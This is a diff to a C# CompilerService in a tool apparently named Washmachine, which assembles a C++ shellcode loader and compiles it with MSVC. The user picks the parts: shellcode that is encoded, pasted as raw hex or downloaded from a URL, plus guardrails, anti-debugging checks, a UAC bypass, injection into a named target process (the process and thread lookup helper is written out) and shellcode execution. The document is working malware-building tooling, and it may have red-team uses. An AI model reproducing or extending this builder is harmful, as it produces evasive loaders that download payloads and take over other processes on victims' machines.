@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Linq;
@@ -15,29 +16,94 @@ namespace Washmachine.Services;
 
 public sealed class CompilerService : ICompilerService
 {
+    private const string ProcessLookupHelper = """
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <tlhelp32.h>
+#include <string>
+#include <algorithm>
+
+DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId)
+{
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE)
+        return 0;
+
+    PROCESSENTRY32W entry{};
+    entry.dwSize = sizeof(entry);
+
+    DWORD result = 0;
+
+    if (Process32FirstW(snapshot, &entry))
+    {
+        do
+        {
+            std::wstring exe = entry.szExeFile;
+            std::wstring exeLower = exe;
+            std::wstring targetLower = processName;
+            std::transform(exeLower.begin(), exeLower.end(), exeLower.begin(), ::towlower);
+            std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::towlower);
+
+            if (exeLower == targetLower)
+            {
+                if (returnProcessId)
+                {
+                    result = entry.th32ProcessID;
+                }
+                else
+                {
+                    HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+                    if (threadSnapshot != INVALID_HANDLE_VALUE)
+                    {
+                        THREADENTRY32 threadEntry{};
+                        threadEntry.dwSize = sizeof(threadEntry);
+                        if (Thread32First(threadSnapshot, &threadEntry))
+                        {
+                            do
+                            {
+                                if (threadEntry.th32OwnerProcessID == entry.th32ProcessID)
+                                {
+                                    result = threadEntry.th32ThreadID;
+                                    break;
+                                }
+                            } while (Thread32Next(threadSnapshot, &threadEntry));
+                        }
+
+                        CloseHandle(threadSnapshot);
+                    }
+                }
+
+                break;
+            }
+        } while (Process32NextW(snapshot, &entry));
+    }
+
+    CloseHandle(snapshot);
+    return result;
+}
+""";
+
     private readonly IAppPaths _paths;
     private readonly IBin2ShellRunner _bin2ShellRunner;
-    private readonly ICppSectionEditor _cppEditor;
     private readonly ICodeSnippetCatalogService _snippets;
     private readonly IAppLogger _logger;
 
     public CompilerService(
         IAppPaths paths,
         IBin2ShellRunner bin2ShellRunner,
-        ICppSectionEditor cppEditor,
         ICodeSnippetCatalogService snippets,
         IAppLogger logger)
     {
         _paths = paths ?? throw new ArgumentNullException(nameof(paths));
         _bin2ShellRunner = bin2ShellRunner ?? throw new ArgumentNullException(nameof(bin2ShellRunner));
-        _cppEditor = cppEditor ?? throw new ArgumentNullException(nameof(cppEditor));
         _snippets = snippets ?? throw new ArgumentNullException(nameof(snippets));
         _logger = logger ?? throw new ArgumentNullException(nameof(logger));
     }
 
-    public async Task<CompilerResult> CompileAsync(UiData data, CancellationToken cancellationToken = default)
+    public async Task<CompilerResult> CompileAsync(UiData data, MsvcToolchain toolchain, CancellationToken cancellationToken = default)
     {
         if (data == null) throw new ArgumentNullException(nameof(data));
+        if (toolchain == null) throw new ArgumentNullException(nameof(toolchain));
 
         ValidateEnvironment();
 
@@ -45,27 +111,36 @@ public sealed class CompilerService : ICompilerService
 
         try
         {
-            RefreshMainCpp(notes);
+            var plan = new CppCompilationPlan();
+            var shellcodeSource = DetermineShellcodeSource(data);
 
-            var source = DetermineShellcodeSource(data);
-            await ApplyShellcodeAsync(data, source, notes, cancellationToken).ConfigureAwait(false);
+            await ApplyShellcodeAsync(plan, data, shellcodeSource, notes, cancellationToken).ConfigureAwait(false);
+            ApplyFeatureSelections(plan, data, notes);
 
-            ApplyFeatureSelections(data, notes);
+            var sourceCode = RenderCompilationUnit(plan);
+            var sourcePath = await PersistSourceAsync(sourceCode, cancellationToken).ConfigureAwait(false);
 
-            notes.Add("Native project files updated. Run the C++ build separately to produce an executable.");
-            return new CompilerResult(true, null, notes);
+            notes.Add($"Generated C++ source at {sourcePath}.");
+            _logger.Ok($"Generated C++ source at {sourcePath}.");
+
+            var executablePath = await CompileWithMsvcAsync(toolchain, sourcePath, notes, cancellationToken).ConfigureAwait(false);
+
+            notes.Add($"Native executable built at {executablePath}.");
+            _logger.Ok($"Native executable built at {executablePath}.");
+
+            return new CompilerResult(true, executablePath, sourcePath, sourceCode, notes);
         }
         catch (OperationCanceledException)
         {
             _logger.Warn("Compilation cancelled by user.");
             notes.Add("Compilation cancelled.");
-            return new CompilerResult(false, null, notes);
+            return new CompilerResult(false, null, null, null, notes);
         }
         catch (Exception ex)
         {
             _logger.Error($"Compilation failed: {ex.Message}");
             notes.Add(ex.Message);
-            return new CompilerResult(false, null, notes);
+            return new CompilerResult(false, null, null, null, notes);
         }
     }
 
@@ -83,32 +158,8 @@ public sealed class CompilerService : ICompilerService
         throw new InvalidOperationException("Required project assets are missing.");
     }
 
-    private void RefreshMainCpp(ICollection<string> notes)
-    {
-        var templatePath = _paths.TemplateCppFile;
-        var mainPath = _paths.MainCppFile;
-
-        if (!File.Exists(templatePath))
-            throw new FileNotFoundException("template.cpp not found.", templatePath);
-
-        var backupDir = Path.Combine(_paths.MainCppDirectory, "maincpp_backups");
-        Directory.CreateDirectory(backupDir);
-
-        if (File.Exists(mainPath))
-        {
-            var backupName = $"main_{DateTime.Now:yyyyMMdd_HHmmss}.cpp";
-            var backupPath = Path.Combine(backupDir, backupName);
-            File.Copy(mainPath, backupPath, overwrite: true);
-            notes.Add($"Existing main.cpp backed up to {backupPath}.");
-            _logger.Info($"Previous main.cpp backed up to {backupPath}.");
-        }
-
-        File.Copy(templatePath, mainPath, overwrite: true);
-        notes.Add("main.cpp refreshed from template.");
-        _logger.Ok("main.cpp refreshed from template.");
-    }
-
     private async Task ApplyShellcodeAsync(
+        CppCompilationPlan plan,
         UiData data,
         ShellcodeSource source,
         ICollection<string> notes,
@@ -117,27 +168,28 @@ public sealed class CompilerService : ICompilerService
         switch (source.Kind)
         {
             case ShellcodeSourceKind.None:
-                _logger.Warn("No shellcode source supplied; using template defaults.");
-                notes.Add("No external shellcode supplied; template defaults remain.");
+                _logger.Warn("No shellcode source supplied; using default stub.");
+                notes.Add("No external shellcode supplied; using default stub.");
                 break;
 
             case ShellcodeSourceKind.File:
-                await EncodeShellcodeFromFileAsync(source.Value, data, notes, cancellationToken).ConfigureAwait(false);
+                await EncodeShellcodeFromFileAsync(plan, source.Value, data, notes, cancellationToken).ConfigureAwait(false);
                 break;
 
             case ShellcodeSourceKind.Raw:
                 string savedPath = SaveRawHexToBin(source.Value);
                 notes.Add($"Raw shellcode saved to {savedPath}.");
-                await EncodeShellcodeFromFileAsync(savedPath, data, notes, cancellationToken).ConfigureAwait(false);
+                await EncodeShellcodeFromFileAsync(plan, savedPath, data, notes, cancellationToken).ConfigureAwait(false);
                 break;
 
             case ShellcodeSourceKind.Url:
-                InjectUrlShellcode(source.Value, notes);
+                InjectUrlShellcode(plan, source.Value, notes);
                 break;
         }
     }
 
     private async Task EncodeShellcodeFromFileAsync(
+        CppCompilationPlan plan,
         string filePath,
         UiData data,
         ICollection<string> notes,
@@ -156,36 +208,139 @@ public sealed class CompilerService : ICompilerService
         if (string.IsNullOrWhiteSpace(encoded))
             throw new InvalidOperationException("Bin2Shell returned empty output.");
 
-        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "/*encodedshellcode*/", encoded, backup: false);
-        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "unsigned int code_blob_len = 0;", string.Empty, backup: false);
-
-        notes.Add("Encoded shellcode injected into main.cpp.");
-        _logger.Ok("Encoded shellcode injected into main.cpp.");
+        plan.EncodedShellcodeSnippet = encoded.Trim();
+        notes.Add("Encoded shellcode prepared.");
+        _logger.Ok("Encoded shellcode prepared.");
     }
 
-    private void InjectUrlShellcode(string url, ICollection<string> notes)
+    private void InjectUrlShellcode(CppCompilationPlan plan, string url, ICollection<string> notes)
     {
         if (string.IsNullOrWhiteSpace(url))
             throw new ArgumentException("URL value is required.", nameof(url));
 
-        _logger.Info($"Embedding shellcode download URL: {url}");
-        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "//URLSHELL ", string.Empty, backup: false);
-        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "$shellurl$", url, backup: false);
-        notes.Add("Shellcode URL embedded into main.cpp.");
+        var escaped = EscapeForCxxString(url.Trim());
+        plan.UrlShellcodeSnippet = $"PCHAR code_blob = UrlDownloadHexTextA((PCHAR)\"{escaped}\", &dwSize);";
+        notes.Add("Shellcode URL embedded into plan.");
         _logger.Ok("Shellcode URL embedded.");
     }
 
-    private void ApplyFeatureSelections(UiData data, ICollection<string> notes)
+    private async Task<string> PersistSourceAsync(string sourceCode, CancellationToken cancellationToken)
     {
-        ApplyComboSelection(data, "genericShellcodeComboBox", "GENERIC SHELLCODE PAYLOADS FOR TESTINGS", notes);
-        ApplyGuardrailSelection(data, notes);
-        ApplyProcessInjectionSelection(data, notes);
-        ApplyComboSelection(data, "shellcodeExecutionComboBox", "SHELLCODE EXECUTION", notes);
-        ApplyComboSelection(data, "UACBComboBox", "UAC BYPASSES", notes);
-        ApplyAntiDebugSelection(data, notes);
+        string directory = _paths.EnsureTempSourceDirectory();
+        Directory.CreateDirectory(directory);
+
+        string fileName = $"wash_{DateTime.UtcNow:yyyyMMdd_HHmmss}_{Guid.NewGuid():N}.cpp";
+        string path = Path.Combine(directory, fileName);
+
+        await File.WriteAllTextAsync(path, sourceCode, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false), cancellationToken)
+            .ConfigureAwait(false);
+
+        return path;
     }
 
-    private void ApplyComboSelection(UiData data, string controlName, string catalogHeader, ICollection<string> notes)
+    private async Task<string> CompileWithMsvcAsync(MsvcToolchain toolchain, string sourcePath, ICollection<string> notes, CancellationToken cancellationToken)
+    {
+        if (!File.Exists(sourcePath))
+            throw new FileNotFoundException("Source file not found.", sourcePath);
+
+        string workingDir = Path.GetDirectoryName(sourcePath) ?? _paths.EnsureTempSourceDirectory();
+        string baseName = Path.GetFileNameWithoutExtension(sourcePath);
+        string objPath = Path.Combine(workingDir, baseName + ".obj");
+        string pdbPath = Path.Combine(workingDir, baseName + ".pdb");
+        string ilkPath = Path.Combine(workingDir, baseName + ".ilk");
+        string exePath = Path.Combine(workingDir, baseName + ".exe");
+
+        string clArgs = string.Join(" ", new[]
+        {
+            "/nologo",
+            "/MD",
+            "/O1",
+            "/GL",
+            "/Gy",
+            "/Gw",
+            "/GF",
+            "/Oy",
+            "/EHsc",
+            "/std:c++17",
+            "/DNDEBUG",
+            $"/Fo{QuoteArg(objPath)}",
+            $"/Fe{QuoteArg(exePath)}",
+            QuoteArg(sourcePath),
+            "/link",
+            "/LTCG",
+            "/OPT:REF",
+            "/OPT:ICF",
+            "/INCREMENTAL:NO"
+        });
+
+        string command = $"call {QuoteArg(toolchain.VcVarsPath)} amd64 && {QuoteArg(toolchain.ClPath)} {clArgs}";
+        notes.Add($"MSVC command: {command}");
+
+        var psi = new ProcessStartInfo("cmd.exe")
+        {
+            Arguments = "/c " + command,
+            WorkingDirectory = workingDir,
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            CreateNoWindow = true
+        };
+
+        using var process = Process.Start(psi) ?? throw new InvalidOperationException("Failed to start MSVC compiler process.");
+        string stdOut = await process.StandardOutput.ReadToEndAsync();
+        string stdErr = await process.StandardError.ReadToEndAsync();
+
+        await process.WaitForExitAsync(cancellationToken).ConfigureAwait(false);
+
+        if (!string.IsNullOrWhiteSpace(stdOut))
+            notes.Add(stdOut.Trim());
+        if (!string.IsNullOrWhiteSpace(stdErr))
+            notes.Add(stdErr.Trim());
+
+        if (process.ExitCode != 0 || !File.Exists(exePath))
+        {
+            throw new InvalidOperationException($"MSVC compilation failed with exit code {process.ExitCode}.\n{stdOut}\n{stdErr}");
+        }
+
+        CleanupIntermediate(objPath, pdbPath, ilkPath);
+        return exePath;
+    }
+
+    private void ApplyFeatureSelections(CppCompilationPlan plan, UiData data, ICollection<string> notes)
+    {
+        ApplyComboSelection(
+            data,
+            "genericShellcodeComboBox",
+            "GENERIC SHELLCODE PAYLOADS FOR TESTINGS",
+            notes,
+            item => plan.GenericShellcodeSnippet = item.Snippet);
+
+        ApplyGuardrailSelection(plan, data, notes);
+        ApplyProcessInjectionSelection(plan, data, notes);
+
+        ApplyComboSelection(
+            data,
+            "shellcodeExecutionComboBox",
+            "SHELLCODE EXECUTION",
+            notes,
+            item => plan.ShellcodeExecutionSnippet = item.Snippet);
+
+        ApplyComboSelection(
+            data,
+            "UACBComboBox",
+            "UAC BYPASSES",
+            notes,
+            item => plan.UacBypassSnippet = item.Snippet);
+
+        ApplyAntiDebugSelection(plan, data, notes);
+    }
+
+    private void ApplyComboSelection(
+        UiData data,
+        string controlName,
+        string catalogHeader,
+        ICollection<string> notes,
+        Action<CodeSnippetItem> apply)
     {
         if (!TryGetNonEmpty(data.ComboBoxes, controlName, out var selection))
             return;
@@ -193,11 +348,11 @@ public sealed class CompilerService : ICompilerService
         if (!TryResolveSnippet(catalogHeader, selection, out var section, out var item))
             return;
 
-        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, item.Snippet);
+        apply(item);
         LogSnippetEnabled(section.Template, item.Id, notes);
     }
 
-    private void ApplyGuardrailSelection(UiData data, ICollection<string> notes)
+    private void ApplyGuardrailSelection(CppCompilationPlan plan, UiData data, ICollection<string> notes)
     {
         if (!TryGetNonEmpty(data.ComboBoxes, "guardrailComboBox", out var selection))
             return;
@@ -219,11 +374,12 @@ public sealed class CompilerService : ICompilerService
 
         snippet = snippet.Replace("$guardrail_param$", parameter)
                          .Replace("__GUARDRAIL_PARAM__", parameter);
-        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, snippet);
+
+        plan.GuardrailSnippets.Add(snippet);
         LogSnippetEnabled(section.Template, item.Id, notes);
     }
 
-    private void ApplyProcessInjectionSelection(UiData data, ICollection<string> notes)
+    private void ApplyProcessInjectionSelection(CppCompilationPlan plan, UiData data, ICollection<string> notes)
     {
         if (!TryGetNonEmpty(data.ComboBoxes, "psInjComboBox", out var selection))
             return;
@@ -236,17 +392,18 @@ public sealed class CompilerService : ICompilerService
 
         var trimmedName = psName.Trim();
         string snippet = item.Snippet.Replace("$psname$", trimmedName);
-        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, snippet);
-        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "/*INJ ", string.Empty, backup: false);
-        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "INJ*/", string.Empty, backup: false);
+
+        plan.ProcessInjectionSnippet = snippet;
+        plan.ProcessLookupHelper = ProcessLookupHelper;
 
         LogSnippetEnabled(section.Template, item.Id, notes);
+
         var note = $"Process injection target set to {trimmedName}.";
         notes.Add(note);
         _logger.Ok(note);
     }
 
-    private void ApplyAntiDebugSelection(UiData data, ICollection<string> notes)
+    private void ApplyAntiDebugSelection(CppCompilationPlan plan, UiData data, ICollection<string> notes)
     {
         if (!data.ListBoxes.TryGetValue("antiDebugListBox", out var selections) || selections.Count == 0)
             return;
@@ -265,8 +422,6 @@ public sealed class CompilerService : ICompilerService
         if (uniqueSelections.Count == 0)
             return;
 
-        var snippets = new List<string>();
-
         foreach (var selection in uniqueSelections)
         {
             if (!section.TryGetItem(selection, out var item))
@@ -275,15 +430,95 @@ public sealed class CompilerService : ICompilerService
                 continue;
             }
 
-            snippets.Add(item.Snippet);
+            plan.AntiDebuggingSnippets.Add(item.Snippet);
             LogSnippetEnabled(section.Template, item.Id, notes);
         }
+    }
 
-        if (snippets.Count == 0)
-            return;
+    private string RenderCompilationUnit(CppCompilationPlan plan)
+    {
+        var sb = new StringBuilder();
+        sb.AppendLine("#include \"Win32Helper.h\"");
+        sb.AppendLine();
 
-        var combined = string.Join(Environment.NewLine, snippets);
-        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, combined);
+        if (!string.IsNullOrWhiteSpace(plan.ProcessLookupHelper))
+        {
+            sb.AppendLine(plan.ProcessLookupHelper!.TrimEnd());
+            sb.AppendLine();
+        }
+
+        sb.AppendLine("INT main(VOID)");
+        sb.AppendLine("{");
+
+        bool hasEncodedShellcode = !string.IsNullOrWhiteSpace(plan.EncodedShellcodeSnippet);
+
+        if (hasEncodedShellcode)
+        {
+            AppendIndentedBlock(sb, plan.EncodedShellcodeSnippet!, 1);
+        }
+        else
+        {
+            sb.AppendLine("    unsigned int code_blob_len = 0;");
+            sb.AppendLine("    PCHAR code_blob = nullptr;");
+        }
+
+        sb.AppendLine("    DWORD dwSize = (DWORD)code_blob_len;");
+
+        if (!string.IsNullOrWhiteSpace(plan.UrlShellcodeSnippet))
+        {
+            sb.AppendLine();
+            sb.AppendLine("    // URL-based shellcode");
+            AppendIndentedBlock(sb, plan.UrlShellcodeSnippet!, 1);
+        }
+
+        if (!string.IsNullOrWhiteSpace(plan.GenericShellcodeSnippet))
+        {
+            sb.AppendLine();
+            sb.AppendLine("    // Generic shellcode payload");
+            AppendIndentedBlock(sb, plan.GenericShellcodeSnippet!, 1);
+        }
+
+        if (plan.GuardrailSnippets.Count > 0)
+        {
+            sb.AppendLine();
+            sb.AppendLine("    // Guardrails");
+            AppendIndentedBlock(sb, string.Join(Environment.NewLine, plan.GuardrailSnippets), 1);
+        }
+
+        if (plan.AntiDebuggingSnippets.Count > 0)
+        {
+            sb.AppendLine();
+            sb.AppendLine("    // Anti-debugging");
+            AppendIndentedBlock(sb, string.Join(Environment.NewLine, plan.AntiDebuggingSnippets), 1);
+        }
+
+        if (!string.IsNullOrWhiteSpace(plan.UacBypassSnippet))
+        {
+            sb.AppendLine();
+            sb.AppendLine("    // UAC bypass");
+            AppendIndentedBlock(sb, plan.UacBypassSnippet!, 1);
+        }
+
+        if (!string.IsNullOrWhiteSpace(plan.ProcessInjectionSnippet))
+        {
+            sb.AppendLine();
+            sb.AppendLine("    // Process injection");
+            AppendIndentedBlock(sb, plan.ProcessInjectionSnippet!, 1);
+        }
+
+        if (!string.IsNullOrWhiteSpace(plan.ShellcodeExecutionSnippet))
+        {
+            sb.AppendLine();
+            sb.AppendLine("    // Shellcode execution");
+            AppendIndentedBlock(sb, plan.ShellcodeExecutionSnippet!, 1);
+        }
+
+        sb.AppendLine();
+        sb.AppendLine("    Sleep(1);");
+        sb.AppendLine("    return 0;");
+        sb.AppendLine("}");
+
+        return sb.ToString();
     }
 
     private bool TryResolveSnippet(string catalogHeader, string selection, out CodeSnippetSection section, out CodeSnippetItem item)
@@ -354,16 +589,20 @@ public sealed class CompilerService : ICompilerService
         int idxEq = raw.IndexOf("Index", StringComparison.OrdinalIgnoreCase);
         if (idxEq >= 0)
         {
-            int eqPos = raw.IndexOf('=', idxEq);
-            if (eqPos > idxEq)
-            {
-                int i = eqPos + 1;
-                while (i < raw.Length && char.IsWhiteSpace(raw[i])) i++;
-                int j = i;
-                while (j < raw.Length && char.IsDigit(raw[j])) j++;
-                if (j > i && int.TryParse(raw.AsSpan(i, j - i), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
-                    return true;
-            }
+            int colon = raw.IndexOf(':', idxEq);
+            if (colon >= 0 && int.TryParse(raw.AsSpan(colon + 1).Trim(), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
+                return true;
+        }
+
+        int eq = raw.IndexOf('=');
+        if (eq >= 0)
+        {
+            int start = eq + 1;
+            while (start < raw.Length && char.IsWhiteSpace(raw[start])) start++;
+            int end = start;
+            while (end < raw.Length && char.IsDigit(raw[end])) end++;
+            if (end > start && int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
+                return true;
         }
 
         int dash = raw.IndexOf('-');
@@ -424,7 +663,7 @@ public sealed class CompilerService : ICompilerService
             throw new ArgumentException("Raw hex input is required.", nameof(raw));
 
         byte[] bytes;
-        var matches = Regex.Matches(raw, @"\\x([0-9A-Fa-f]{2})");
+        var matches = Regex.Matches(raw, "\\\\x([0-9A-Fa-f]{2})");
         if (matches.Count > 0)
         {
             bytes = new byte[matches.Count];
@@ -456,6 +695,8 @@ public sealed class CompilerService : ICompilerService
         string hashHex = sb.ToString();
 
         string dir = _paths.EnsureTempShellcodeDirectory();
+        Directory.CreateDirectory(dir);
+
         string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss", CultureInfo.InvariantCulture);
         string fileName = $"{hashHex}_{timestamp}.bin";
         string path = Path.Combine(dir, fileName);
@@ -473,6 +714,55 @@ public sealed class CompilerService : ICompilerService
         return value.IndexOfAny(new[] { ' ', '\t', '"' }) >= 0
             ? $"\"{value.Replace("\"", "\\\"")}\""
             : value;
+    }
+
+    private static string EscapeForCxxString(string value)
+        => value.Replace("\\", "\\\\").Replace("\"", "\\\"");
+
+    private static void AppendIndentedBlock(StringBuilder sb, string content, int indentLevel)
+    {
+        if (string.IsNullOrWhiteSpace(content))
+            return;
+
+        string indent = new string(' ', indentLevel * 4);
+        foreach (var line in SplitLines(content))
+        {
+            if (line.Length == 0)
+            {
+                sb.AppendLine(indent);
+            }
+            else
+            {
+                sb.Append(indent);
+                sb.AppendLine(line);
+            }
+        }
+    }
+
+    private static IEnumerable<string> SplitLines(string value)
+    {
+        return value
+            .Replace("\r\n", "\n")
+            .Replace('\r', '\n')
+            .Split('\n');
+    }
+
+    private static void CleanupIntermediate(params string[] paths)
+    {
+        foreach (var path in paths)
+        {
+            try
+            {
+                if (!string.IsNullOrWhiteSpace(path) && File.Exists(path))
+                {
+                    File.Delete(path);
+                }
+            }
+            catch
+            {
+                // ignore cleanup failures
+            }
+        }
     }
 
     private sealed record ShellcodeSource(ShellcodeSourceKind Kind, string Value);
